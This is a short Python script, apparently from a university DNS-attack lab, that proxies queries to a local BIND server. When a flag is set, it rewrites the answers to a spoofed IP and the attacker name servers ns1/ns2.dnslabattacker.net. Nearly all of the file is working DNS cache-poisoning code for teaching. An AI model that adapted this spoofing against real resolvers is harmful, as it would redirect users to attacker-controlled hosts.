#!/usr/bin/env python
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument(
    "--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument(
    "--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true",
                    help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Host and Port to run the proxy on
host = '127.0.0.1'
port = args.port
# BIND's host
dns_host = "127.0.0.1"
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response
spoof_ip = "5.6.6.8"
spoof_ns = ["ns1.dnslabattacker.net", "ns2.dnslabattacker.net"]

# the size in bytes of the buffer used to receive the data
buff_size = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind((host, port))


if __name__ == '__main__':
    while True:
        req_data, req_addr = s.recvfrom(buff_size)
        s.sendto(req_data, (dns_host, dns_port))
        dns_res, dns_addr = s.recvfrom(buff_size)
        if not SPOOF:
            s.sendto(bytes(dns_res), req_addr)
        else:
            spoof_res = DNS(dns_res)
            spoof_res.an.rdata = spoof_ip
            spoof_res.nscount = len(spoof_ns)
            for i in range(len(spoof_ns)):
                spoof_res.ns['DNSRR'][i].rdata = spoof_ns[i]
            spoof_res.arcount = 0
            s.sendto(bytes(spoof_res), req_addr)

